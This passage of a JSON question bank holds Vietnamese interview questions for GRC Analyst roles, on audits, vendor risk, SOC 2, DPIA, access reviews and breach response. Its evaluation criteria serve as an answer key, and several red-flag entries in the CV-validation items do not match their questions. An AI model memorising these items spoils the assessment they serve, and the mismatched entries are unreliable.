          "Risk-based Audit",
          "Audit Evidence",
          "Finding Report",
          "5C Format"
        ],
        "sourceRefs": [
          "https://www.iso.org/standard/27001",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Kiểm toán bằng cách gửi bảng câu hỏi tự đánh giá và tin hoàn toàn vào câu trả lời mà không kiểm chứng"
        ]
      },
      {
        "id": "GRC-PRAC-04",
        "role": "GRC Analyst",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Quản lý Đánh giá Rủi ro Bên thứ ba (Third-Party Risk Management - TPRM): Cách đánh giá an ninh của nhà cung cấp dịch vụ đám mây, đối tác phần mềm và bên gia công phần mềm (Vendor Security Assessment)?",
        "evaluationCriteria": [
          "Phân loại vendor theo mức độ rủi ro: Critical (truy cập dữ liệu nhạy cảm), High (tích hợp API hệ thống cốt lõi), Medium, Low",
          "Đánh giá: Gửi bộ câu hỏi chuẩn (SIG Questionnaire hoặc CAIQ), yêu cầu cung cấp chứng chỉ SOC 2 Type II / ISO 27001 / Penetration Test Report",
          "Theo dõi liên tục: Không chỉ đánh giá một lần khi ký hợp đồng; giám sát định kỳ bằng các dịch vụ Security Rating (BitSight, SecurityScorecard) và thỏa thuận hợp đồng SLA an ninh bắt buộc"
        ],
        "followUps": [
          "Tại sao sự cố an ninh tại nhà cung cấp bên thứ ba có thể phá sản doanh nghiệp của bạn (SolarWinds, Kaseya)?",
          "Cách xử lý khi một vendor Critical từ chối cung cấp báo cáo SOC 2?"
        ],
        "tags": [
          "Third-Party Risk",
          "Vendor Security Assessment",
          "SIG Questionnaire",
          "SOC 2 Review",
          "SecurityScorecard"
        ],
        "sourceRefs": [
          "https://www.nist.gov/cyberframework",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Ký hợp đồng với vendor xử lý dữ liệu nhạy cảm mà không yêu cầu bất kỳ chứng nhận an ninh nào"
        ]
      },
      {
        "id": "GRC-PRAC-05",
        "role": "GRC Analyst",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Quản lý Chương trình Nâng cao Nhận thức An ninh Thông tin (Security Awareness Program): Cách thiết kế và đo lường hiệu quả các chiến dịch đào tạo phòng chống lừa đảo Phishing cho toàn bộ nhân viên?",
        "evaluationCriteria": [
          "Thiết kế chương trình đào tạo: Kết hợp đa phương thức - E-learning ngắn (video 5-10 phút), Quiz tương tác, Poster/Infographic dán trong văn phòng, và Simulated Phishing Campaigns",
          "Mô phỏng Phishing: Gửi email giả mạo định kỳ tới nhân viên; theo dõi tỷ lệ click link, tỷ lệ nhập mật khẩu, và tỷ lệ báo cáo email nghi ngờ lên đội IT",
          "Đo lường hiệu quả: Theo dõi xu hướng Phishing Click Rate giảm dần sau mỗi đợt; tỷ lệ báo cáo nghi ngờ tăng lên; liên kết kết quả đào tạo với dữ liệu sự cố thực tế"
        ],
        "followUps": [
          "Cách xử lý khi một nhân viên liên tục bị 'dính' email giả mạo qua nhiều lần kiểm tra?",
          "Tại sao đào tạo Awareness không nên mang tính trừng phạt mà phải mang tính khuyến khích?"
        ],
        "tags": [
          "Security Awareness",
          "Phishing Simulation",
          "Click Rate Metrics",
          "Behavior Change",
          "Gamification"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ tổ chức một buổi đào tạo bắt buộc mỗi năm bằng slide PowerPoint khô khan"
        ]
      },
      {
        "id": "GRC-PRAC-06",
        "role": "GRC Analyst",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Xây dựng Kế hoạch Liên tục Kinh doanh và Phục hồi sau Thảm họa (BCP/DRP - Business Continuity Plan / Disaster Recovery Plan): Các bước phân tích tác động kinh doanh (BIA - Business Impact Analysis)?",
        "evaluationCriteria": [
          "BIA: Xác định các quy trình kinh doanh trọng yếu nhất; đánh giá tác động tài chính, pháp lý và uy tín nếu mỗi quy trình bị gián đoạn theo thời gian (1 giờ, 4 giờ, 24 giờ, 7 ngày)",
          "Thiết lập chỉ số: RPO (Recovery Point Objective - mức mất dữ liệu tối đa chấp nhận được) và RTO (Recovery Time Objective - thời gian phục hồi dịch vụ tối đa chấp nhận được) cho từng hệ thống",
          "DRP: Kế hoạch kỹ thuật chi tiết để khôi phục các hệ thống CNTT quan trọng; BCP: Kế hoạch tổng thể rộng hơn bao gồm cả nhân sự, vị trí làm việc dự phòng, và liên lạc khẩn cấp"
        ],
        "followUps": [
          "Tại sao kế hoạch BCP/DRP bắt buộc phải được diễn tập thực tế (Tabletop Exercise / Full-scale Drill) ít nhất mỗi năm một lần?",
          "Khác biệt giữa RPO và RTO khi đưa ra quyết định đầu tư hệ thống sao lưu?"
        ],
        "tags": [
          "BCP DRP",
          "Business Impact Analysis",
          "RPO RTO",
          "Tabletop Exercise",
          "Crisis Management"
        ],
        "sourceRefs": [
          "https://www.iso.org/standard/27001",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Viết kế hoạch BCP/DRP 100 trang nhưng chưa bao giờ thử nghiệm trong thực tế"
        ]
      },
      {
        "id": "GRC-PRAC-07",
        "role": "GRC Analyst",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Chuẩn bị và hỗ trợ doanh nghiệp đạt chứng nhận SOC 2 Type II (Service Organization Control): Phân biệt 5 Trust Services Criteria (Security, Availability, Processing Integrity, Confidentiality, Privacy) và quy trình chuẩn bị bằng chứng?",
        "evaluationCriteria": [
          "SOC 2 Type I: Đánh giá thiết kế kiểm soát tại một thời điểm; Type II: Đánh giá hiệu quả vận hành liên tục trong khoảng thời gian 6-12 tháng (bền vững hơn, có giá trị hơn nhiều)",
          "Trust Services Criteria: Security là tiêu chí bắt buộc; các tiêu chí khác (Availability, Confidentiality...) tùy chọn theo dịch vụ cung cấp",
          "Chuẩn bị bằng chứng: Thu thập screenshots cấu hình, log truy cập, biên bản rà soát, bản ghi đào tạo nhân viên, kết quả kiểm thử xâm nhập, và báo cáo quét lỗ hổng theo từng Control Objective"
        ],
        "followUps": [
          "Tại sao khách hàng doanh nghiệp (B2B SaaS) ngày càng yêu cầu bắt buộc nhà cung cấp phải có SOC 2 Type II?",
          "Cách quản lý lượng bằng chứng khổng lồ bằng các nền tảng GRC tự động (Vanta, Drata, Thoropass)?"
        ],
        "tags": [
          "SOC 2 Type II",
          "Trust Services Criteria",
          "Evidence Collection",
          "Audit Readiness",
          "GRC Automation"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Thu thập bằng chứng vào phút chót trước kỳ kiểm toán thay vì duy trì liên tục suốt 12 tháng"
        ]
      },
      {
        "id": "GRC-PRAC-08",
        "role": "GRC Analyst",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Đánh giá tác động bảo vệ dữ liệu (DPIA - Data Protection Impact Assessment) theo GDPR Điều 35: Quy trình thực hiện và thời điểm bắt buộc?",
        "evaluationCriteria": [
          "Bắt buộc khi: Xử lý dữ liệu nhạy cảm quy mô lớn, giám sát hành vi cá nhân, sử dụng công nghệ mới (AI profiling, biometric identification), hoặc kết hợp các loại dữ liệu tạo hồ sơ cá nhân",
          "Quy trình: Mô tả hoạt động xử lý dữ liệu -> Đánh giá tính cần thiết và cân xứng -> Nhận diện rủi ro đối với quyền tự do của chủ thể dữ liệu -> Đề xuất biện pháp giảm thiểu rủi ro",
          "Kết quả: Báo cáo DPIA phải được DPO (Data Protection Officer) xem xét; nếu rủi ro còn lại vẫn cao sau khi áp dụng biện pháp, phải tham vấn cơ quan bảo vệ dữ liệu trước khi xử lý"
        ],
        "followUps": [
          "Ai chịu trách nhiệm phê duyệt DPIA: DPO hay Data Controller?",
          "Cách thuyết phục đội sản phẩm thực hiện DPIA trước khi phát triển tính năng AI mới?"
        ],
        "tags": [
          "DPIA",
          "GDPR Article 35",
          "Privacy by Design",
          "DPO Consultation",
          "Risk to Data Subjects"
        ],
        "sourceRefs": [
          "https://gdpr-info.eu/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Bỏ qua DPIA cho một dự án AI nhận diện khuôn mặt nhân viên vì cho rằng đây là 'dự án nội bộ'"
        ]
      },
      {
        "id": "GRC-SCEN-01",
        "role": "GRC Analyst",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Tại GRC Analyst, khi Multi-framework Compliance cùng Control Mapping, Compliance Roadmap, Budget Optimization xuất hiện và em bắt gặp cảnh báo đáng ngờ trong môi trường thực hành được cấp phép, em kiểm tra log hay dữ liệu nào trước?",
        "evaluationCriteria": [
          "Làm rõ hiện tượng và thu thập thông tin trước khi kết luận.",
          "Đề xuất bước xử lý ban đầu an toàn, phù hợp với Intern/Fresher trong GRC Analyst.",
          "Biết xác nhận kết quả và báo người hướng dẫn khi vấn đề vượt quá phạm vi hiểu biết."
        ],
        "followUps": [
          "Em sẽ tóm tắt phát hiện và phần chưa chắc chắn với người hướng dẫn như thế nào?"
        ],
        "tags": [
          "Multi-framework Compliance",
          "Control Mapping",
          "Compliance Roadmap",
          "Budget Optimization"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Đưa ra hành động rủi ro, vượt quyền hoặc bỏ qua bước xác minh và báo cáo."
        ]
      },
      {
        "id": "GRC-SCEN-02",
        "role": "GRC Analyst",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Trong đợt rà soát quyền truy cập định kỳ (Periodic Access Review - User Access Recertification), em phát hiện 15 tài khoản của nhân viên đã nghỉ việc từ 3-6 tháng trước vẫn đang hoạt động với quyền Admin trên hệ thống ERP tài chính. Đây là vi phạm nghiêm trọng. Em xử lý và cải tiến quy trình ra sao?",
        "evaluationCriteria": [
          "Hành động khẩn cấp: Lập tức vô hiệu hóa toàn bộ 15 tài khoản đó; kiểm tra log hoạt động 6 tháng qua xem có dấu hiệu truy cập bất thường hay không",
          "Phân tích nguyên nhân gốc: Quy trình Offboarding thiếu bước tự động tắt tài khoản khi Phòng Nhân sự cập nhật trạng thái nhân viên nghỉ việc; thiếu liên kết giữa hệ thống HR và hệ thống IAM/AD",
          "Cải tiến quy trình: Thiết lập tích hợp tự động HR -> IAM: Khi trạng thái nhân viên chuyển sang 'Nghỉ việc' trong HRIS, hệ thống tự động disable tài khoản AD/Email/VPN trong vòng 24 giờ; rà soát quyền truy cập định kỳ hàng quý (Quarterly Access Review) với sign-off bắt buộc từ quản lý trực tiếp"
        ],
        "followUps": [
          "Tại sao tài khoản 'Orphaned Account' (tài khoản mồ côi) lại là một trong những rủi ro bảo mật cao nhất?",
          "Cách thiết kế Joiner-Mover-Leaver (JML) Process tự động hóa quản lý vòng đời tài khoản?"
        ],
        "tags": [
          "Access Recertification",
          "Orphaned Accounts",
          "Offboarding Process",
          "JML Lifecycle",
          "Automated Deprovisioning"
        ],
        "sourceRefs": [
          "https://www.iso.org/standard/27001",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Ghi nhận vi phạm nhưng không kiểm tra log hoạt động và không cải tiến quy trình gốc"
        ]
      },
      {
        "id": "GRC-SCEN-03",
        "role": "GRC Analyst",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Cơ quan quản lý gửi công văn yêu cầu doanh nghiệp giải trình về một vụ rò rỉ dữ liệu cá nhân ảnh hưởng đến 50,000 khách hàng. Em phối hợp với Bộ phận Pháp chế chuẩn bị hồ sơ giải trình và kế hoạch khắc phục như thế nào?",
        "evaluationCriteria": [
          "Thu thập sự thật: Phối hợp đội IR xác định chính xác phạm vi dữ liệu bị lộ (PII loại gì, bao nhiêu bản ghi, nguyên nhân kỹ thuật)",
          "Chuẩn bị hồ sơ giải trình: Mô tả chi tiết sự kiện theo dòng thời gian, các biện pháp ngăn chặn đã thực hiện ngay lập tức, phân tích nguyên nhân gốc rễ, và kế hoạch khắc phục với timeline cụ thể",
          "Hợp tác chặt chẽ với Pháp chế: Đảm bảo ngôn ngữ báo cáo chính xác về mặt pháp lý; không thừa nhận lỗi trước khi có ý kiến luật sư; chuẩn bị phương án hỗ trợ người dùng bị ảnh hưởng (giám sát tín dụng, đường dây nóng)"
        ],
        "followUps": [
          "Thời hạn báo cáo sự cố vi phạm dữ liệu theo Nghị định 13/2023/NĐ-CP là bao lâu?",
          "Cách xây dựng template Breach Response Plan sẵn sàng sử dụng ngay?"
        ],
        "tags": [
          "Regulatory Response",
          "Breach Disclosure",
          "Legal Collaboration",
          "Remediation Plan",
          "Affected User Support"
        ],
        "sourceRefs": [
          "https://gdpr-info.eu/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Tự ý gửi thông báo công khai trên mạng xã hội trước khi phối hợp với Pháp chế và cơ quan quản lý"
        ]
      },
      {
        "id": "GRC-SCEN-04",
        "role": "GRC Analyst",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Đội phát triển sản phẩm muốn tích hợp dịch vụ AI chatbot của một startup nhỏ tại nước ngoài vào ứng dụng chính, yêu cầu gửi toàn bộ nội dung hội thoại khách hàng (bao gồm thông tin cá nhân) sang API của startup đó. Em thực hiện đánh giá rủi ro bên thứ ba cho trường hợp này ra sao?",
        "evaluationCriteria": [
          "Bước 1: Phân loại vendor: Đây là vendor Critical vì xử lý dữ liệu cá nhân nhạy cảm của khách hàng",
          "Bước 2: Due Diligence: Yêu cầu startup cung cấp chứng chỉ SOC 2 hoặc ISO 27001; kiểm tra nơi lưu trữ dữ liệu (data residency), chính sách sử dụng dữ liệu để huấn luyện mô hình AI, và chính sách xóa dữ liệu sau khi hết hợp đồng",
          "Bước 3: DPIA: Đánh giá tác động bảo vệ dữ liệu cá nhân khi chuyển dữ liệu ra nước ngoài",
          "Bước 4: Hợp đồng pháp lý: Yêu cầu ký Data Processing Agreement (DPA) với các điều khoản bảo mật bắt buộc, quyền kiểm toán, và cam kết không sử dụng dữ liệu khách hàng để huấn luyện AI"
        ],
        "followUps": [
          "Rủi ro gì nếu startup phá sản và dữ liệu khách hàng bị thanh lý?",
          "Cách đánh giá startup không có SOC 2 hay ISO 27001?"
        ],
        "tags": [
          "AI Vendor Risk",
          "Data Processing Agreement",
          "Cross-border Data Transfer",
          "DPIA for AI",
          "Vendor Due Diligence"
        ],
        "sourceRefs": [
          "https://gdpr-info.eu/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cho phép tích hợp ngay lập tức vì đội sản phẩm 'rất cần gấp' mà không đánh giá rủi ro"
        ]
      },
      {
        "id": "GRC-SCEN-05",
        "role": "GRC Analyst",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Trong đợt kiểm toán nội bộ, em phát hiện đội vận hành IT đã sử dụng một tài khoản dịch vụ dùng chung (Shared Service Account) với mật khẩu không đổi suốt 3 năm để quản trị hơn 50 máy chủ Production. Mật khẩu này được lưu trong file Excel không mã hóa trên SharePoint chung. Em xử lý phát hiện kiểm toán nghiêm trọng này như thế nào?",
        "evaluationCriteria": [
          "Ghi nhận phát hiện kiểm toán: Phân loại mức độ nghiêm trọng Critical; mô tả chi tiết rủi ro (bất kỳ ai có quyền đọc SharePoint đều có thể truy cập toàn bộ 50 server)",
          "Khuyến nghị khắc phục: Đổi mật khẩu ngay lập tức; chuyển sang hệ thống PAM (Privileged Access Management) như CyberArk hoặc BeyondTrust với tính năng quay vòng mật khẩu tự động, ghi video phiên làm việc (Session Recording), và phê duyệt truy cập từng lần (Just-in-Time Access)",
          "Xóa file Excel chứa mật khẩu; thiết lập chính sách cấm lưu trữ thông tin xác thực trên các nền tảng chia sẻ file"
        ],
        "followUps": [
          "Tại sao Shared Service Accounts là một trong những rủi ro lớn nhất trong quản trị hệ thống?",
          "Cách thuyết phục đội IT đầu tư vào PAM khi họ quen sử dụng phương pháp 'xài chung mật khẩu' hàng chục năm?"
        ],
        "tags": [
          "Shared Account Risk",
          "PAM Solution",
          "CyberArk",
          "Just-in-Time Access",
          "Audit Finding Remediation"
        ],
        "sourceRefs": [
          "https://www.iso.org/standard/27001",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Ghi nhận phát hiện nhưng chấp nhận Risk Acceptance vô thời hạn vì đội IT phản đối thay đổi"
        ]
      },
      {
        "id": "GRC-SCEN-06",
        "role": "GRC Analyst",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Công ty mẹ tại Singapore yêu cầu chi nhánh Việt Nam phải tuân thủ đồng thời cả PDPA Singapore và Nghị định 13/2023/NĐ-CP Việt Nam. Hai quy định có một số điểm xung đột (vd: nghĩa vụ lưu trữ dữ liệu tại chỗ vs nhu cầu truyền dữ liệu về trụ sở chính). Em tham mưu giải pháp cho Ban Giám đốc ra sao?",
        "evaluationCriteria": [
          "Phân tích so sánh: Lập bảng đối chiếu chi tiết từng điều khoản giữa hai quy định; xác định các điểm chồng lắp (có thể áp dụng tiêu chuẩn cao hơn) và các điểm xung đột cần giải pháp riêng",
          "Giải pháp kỹ thuật cho truyền dữ liệu xuyên biên giới: Áp dụng các Tiêu chuẩn hợp đồng chuẩn (Standard Contractual Clauses - SCCs), đánh giá tác động truyền dữ liệu (Transfer Impact Assessment)",
          "Tham vấn pháp lý: Thuê luật sư chuyên ngành bảo vệ dữ liệu tại cả hai quốc gia để xác nhận chiến lược tuân thủ; thiết lập kênh liên lạc với cơ quan quản lý tại Việt Nam (Bộ Công an)"
        ],
        "followUps": [
          "Nguyên tắc 'Lấy tiêu chuẩn cao nhất' (Highest Common Denominator) áp dụng ra sao?",
          "Cách thiết kế kiến trúc dữ liệu tuân thủ yêu cầu 'Data Localization' của nhiều quốc gia?"
        ],
        "tags": [
          "Cross-border Compliance",
          "Multi-jurisdiction Privacy",
          "SCCs",
          "Data Localization",
          "Regulatory Harmonization"
        ],
        "sourceRefs": [
          "https://gdpr-info.eu/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Áp dụng chỉ một quy định và bỏ qua quy định còn lại"
        ]
      },
      {
        "id": "GRC-CV-01",
        "role": "GRC Analyst",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Trong CV em có ghi kinh nghiệm hỗ trợ doanh nghiệp đạt chứng nhận ISO 27001 hoặc SOC 2: Hãy chia sẻ về vai trò cụ thể của em trong dự án triển khai đó từ lúc bắt đầu đến khi đạt chứng nhận?",
        "evaluationCriteria": [
          "Vai trò: Tư vấn nội bộ hay tư vấn bên ngoài, phạm vi ISMS, số lượng kiểm soát triển khai",
          "Thách thức lớn nhất: Gap lớn nhất phát hiện trong đợt Gap Analysis và cách khắc phục",
          "Kết quả: Thời gian đạt chứng nhận, số lượng Non-conformities phát hiện trong đợt audit"
        ],
        "followUps": [
          "Phát hiện kiểm toán nào khiến em phải thay đổi đáng kể quy trình ban đầu?",
          "Bài học kinh nghiệm lớn nhất rút ra từ dự án đó?"
        ],
        "tags": [
          "ISO 27001 Implementation",
          "SOC 2 Readiness",
          "Gap Analysis",
          "Certification Journey"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Khai man kinh nghiệm triển khai khung tuân thủ, không nắm rõ sự khác biệt giữa các tiêu chuẩn ISO 27001 và SOC 2"
        ]
      },
      {
        "id": "GRC-CV-02",
        "role": "GRC Analyst",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "CV của em đề cập việc xây dựng Chương trình Quản lý Rủi ro An ninh Thông tin (Information Security Risk Management Program): Hãy mô tả phương pháp đánh giá rủi ro mà em đã áp dụng và cách trình bày kết quả cho Ban Giám đốc?",
        "evaluationCriteria": [
          "Phương pháp: Qualitative hay Quantitative hay kết hợp; framework sử dụng (NIST RMF, ISO 27005, FAIR)",
          "Risk Register: Số lượng rủi ro đã nhận diện, phân loại theo mức độ nghiêm trọng",
          "Trình bày cho lãnh đạo: Sử dụng Heat Map hay Risk Dashboard; cách chuyển đổi rủi ro kỹ thuật thành ngôn ngữ tác động kinh doanh"
        ],
        "followUps": [
          "Làm thế nào để đảm bảo Risk Register được cập nhật liên tục chứ không chỉ phục vụ đợt kiểm toán?",
          "Cách thuyết phục Business Owners nhận trách nhiệm là Risk Owners?"
        ],
        "tags": [
          "Risk Assessment Methodology",
          "Risk Register Management",
          "Executive Reporting",
          "FAIR Model"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Phóng đại khả năng đánh giá rủi ro mà không giải thích được phương pháp định lượng hoặc ma trận rủi ro cụ thể"
        ]
      },
      {
        "id": "GRC-CV-03",
        "role": "GRC Analyst",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Em ghi nhận có kỹ năng soạn thảo chính sách và quy trình an toàn thông tin: Hãy chia sẻ về một bộ chính sách mà em đã tự tay soạn thảo hoặc cập nhật và cách em đảm bảo nhân viên thực sự đọc và tuân thủ?",
        "evaluationCriteria": [
          "Phạm vi chính sách: Loại chính sách (Acceptable Use Policy, Password Policy, Data Classification, Incident Response)",
          "Cách truyền thông: Phương pháp triển khai để nhân viên thực sự đọc và hiểu (không chỉ bấm 'Đồng ý' cho xong)",
          "Đo lường tuân thủ: Cách kiểm tra xem chính sách có thực sự được tuân thủ trong thực tế"
        ],
        "followUps": [
          "Chính sách nào thường bị nhân viên vi phạm nhiều nhất theo kinh nghiệm của em?",
          "Cách xử lý khi phát hiện một phòng ban liên tục vi phạm chính sách?"
        ],
        "tags": [
          "Policy Development",
          "Employee Communication",
          "Compliance Monitoring",
          "Policy Enforcement"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Khai man kinh nghiệm kiểm toán nội bộ, không phân biệt được kiểm toán tuân thủ và kiểm toán hiệu quả vận hành"
        ]
      },
      {
        "id": "GRC-CV-04",
        "role": "GRC Analyst",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Trong hồ sơ có ghi em từng thực hiện Đánh giá Rủi ro Bên thứ ba (Third-Party Risk Assessment): Hãy mô tả quy trình đánh giá vendor của em từ lúc tiếp nhận yêu cầu tích hợp đến khi đưa ra quyết định chấp thuận hoặc từ chối?",
        "evaluationCriteria": [
          "Quy trình: Tiếp nhận yêu cầu từ đội sản phẩm -> Phân loại mức độ rủi ro vendor -> Gửi bộ câu hỏi đánh giá -> Phân tích kết quả và chứng nhận -> Đưa ra quyết định kèm điều kiện",
          "Khó khăn: Vendor nào đã từng bị em từ chối và lý do cụ thể",
          "Theo dõi liên tục: Cách giám sát vendor sau khi đã chấp thuận hợp đồng"
        ],
        "followUps": [
          "Cách xử lý khi đội kinh doanh gây áp lực ép em chấp thuận một vendor có nhiều rủi ro?",
          "Những red flags phổ biến nhất khi đánh giá vendor?"
        ],
        "tags": [
          "TPRM Process",
          "Vendor Due Diligence",
          "Risk-based Decision",
          "Ongoing Monitoring"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không chứng minh được năng lực soạn thảo chính sách bảo mật thực tế có tính ứng dụng cao"
        ]
      },
      {
        "id": "GRC-CV-05",
        "role": "GRC Analyst",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "CV có ghi em sử dụng thành thạo các nền tảng GRC tự động hóa (như Vanta, Drata, ServiceNow GRC, Archer): Hãy chia sẻ cách em tận dụng nền tảng đó để giảm thiểu công sức thủ công trong việc thu thập bằng chứng tuân thủ?",
        "evaluationCriteria": [
          "Nền tảng sử dụng: Tên công cụ, phạm vi triển khai, số lượng framework tuân thủ quản lý",
          "Tự động hóa: Các kiểm soát nào được giám sát tự động liên tục (Continuous Monitoring) thay vì thu thập bằng chứng thủ công",
          "Kết quả: Thời gian chuẩn bị kiểm toán giảm bao nhiêu %, tỷ lệ tuân thủ liên tục (Compliance Score) đạt bao nhiêu"
        ],
        "followUps": [
          "Hạn chế lớn nhất của các nền tảng GRC tự động mà em đã gặp phải?",
          "Cách xử lý các kiểm soát không thể tự động hóa hoàn toàn (vd: Physical Security)?"
        ],
        "tags": [
          "GRC Platform",
          "Continuous Compliance",
          "Evidence Automation",
          "Vanta / Drata"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Phóng đại kinh nghiệm GDPR/PDPA mà không hiểu cơ chế đánh giá tác động quyền riêng tư (DPIA)"
        ]
      },
      {
        "id": "GRC-BEHAV-01",
        "role": "GRC Analyst",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Công việc GRC thường bị các đội kỹ thuật xem là 'cảnh sát giấy tờ' hoặc 'bộ máy quan liêu' gây cản trở công việc phát triển sản phẩm. Em làm thế nào để thay đổi nhận thức này và chứng minh giá trị thực sự của GRC?",
        "evaluationCriteria": [
          "Thấu hiểu nỗi frustration: Đội kỹ thuật có lý khi bực mình nếu GRC chỉ biết gửi checklist Excel dài 200 dòng và yêu cầu fill form",
          "Chuyển đổi cách tiếp cận: Tự động hóa tối đa việc thu thập bằng chứng (tích hợp với GitHub, AWS, Jira); giảm thiểu tác động thủ công lên workflow của dev",
          "Chứng minh giá trị kinh doanh: Trình bày rõ ràng rằng nhờ có SOC 2, công ty đã ký được hợp đồng với khách hàng Fortune 500 trị giá X triệu USD; nhờ có GRC, công ty tránh được mức phạt Y triệu USD theo quy định GDPR"
        ],
        "followUps": [
          "Khi nào thì GRC cần giữ vững lập trường kiên quyết dù bị đội kỹ thuật phản đối?",
          "Cách xây dựng mối quan hệ đối tác tin cậy với các Tech Lead?"
        ],
        "tags": [
          "GRC Value Proposition",
          "Cross-functional Partnership",
          "Automation-first Mindset",
          "Business Alignment"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Tự coi mình là 'cảnh sát' đi kiểm tra bắt lỗi thay vì là 'người hỗ trợ' giúp doanh nghiệp phát triển an toàn"
        ]
      },
      {
        "id": "GRC-BEHAV-02",
        "role": "GRC Analyst",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Khi em phát hiện một phòng ban liên tục vi phạm chính sách an ninh thông tin (vd: chia sẻ mật khẩu qua email, không khóa máy khi rời bàn) dù đã được nhắc nhở nhiều lần, em xử lý tình huống này ra sao?",
        "evaluationCriteria": [
          "Điều tra nguyên nhân gốc: Tìm hiểu tại sao họ vi phạm (chính sách quá phức tạp, công cụ gây bất tiện, hay đơn giản là thiếu nhận thức)",
          "Giải pháp đồng cảm: Đề xuất các công cụ tiện lợi thay thế (Password Manager thay vì ghi mật khẩu trên giấy; Auto-lock screen policy thay vì nhắc nhở thủ công)",
          "Leo thang có trách nhiệm: Nếu sau khi đã hỗ trợ mà vẫn vi phạm, phải báo cáo khách quan lên quản lý trực tiếp của phòng ban đó theo đúng quy trình kỷ luật"
        ],
        "followUps": [
          "Tại sao việc 'hình sự hóa' vi phạm chính sách (public shaming, phạt tiền) thường phản tác dụng?",
          "Cách thiết kế chính sách an ninh mà người dùng thực sự muốn tuân thủ (Usable Security)?"
        ],
        "tags": [
          "Policy Enforcement",
          "Root Cause Investigation",
          "Empathetic Approach",
          "Usable Security"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Gửi email CC toàn công ty chỉ trích phòng ban vi phạm hoặc ngược lại bỏ mặc không xử lý"
        ]
      },
      {
        "id": "GRC-BEHAV-03",
        "role": "GRC Analyst",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Trong quá trình tham mưu chiến lược an ninh thông tin, em nhận thấy Ban Giám đốc đang đánh giá quá thấp rủi ro an ninh mạng và liên tục cắt giảm ngân sách bảo mật. Em thuyết phục và truyền đạt tầm quan trọng của an ninh thông tin lên cấp quản trị cao nhất như thế nào?",
        "evaluationCriteria": [
          "Nói bằng ngôn ngữ kinh doanh: Không dùng thuật ngữ kỹ thuật; trình bày rủi ro dưới dạng tác động tài chính (chi phí trung bình một vụ vi phạm dữ liệu, mức phạt quy định, thiệt hại uy tín thương hiệu)",
          "Case study thực tế: Đưa ra ví dụ các doanh nghiệp cùng ngành đã bị tấn công và hậu quả cụ thể (công ty X phá sản sau ransomware, công ty Y bị phạt Z triệu USD)",
          "Đề xuất phương án có ROI rõ ràng: Thay vì xin ngân sách mơ hồ, trình bày cụ thể: 'Đầu tư 500 triệu VND cho PAM system sẽ giảm 80% rủi ro bị tấn công chiếm quyền admin, tương đương giảm 5 tỷ VND tổn thất tiềm ẩn'"
        ],
        "followUps": [
          "Khi Ban Giám đốc vẫn từ chối đầu tư sau khi đã trình bày, em ghi nhận quyết định này ra sao?",
          "Cách xây dựng văn hóa 'Tone from the Top' (cam kết bảo mật từ cấp lãnh đạo cao nhất)?"
        ],
        "tags": [
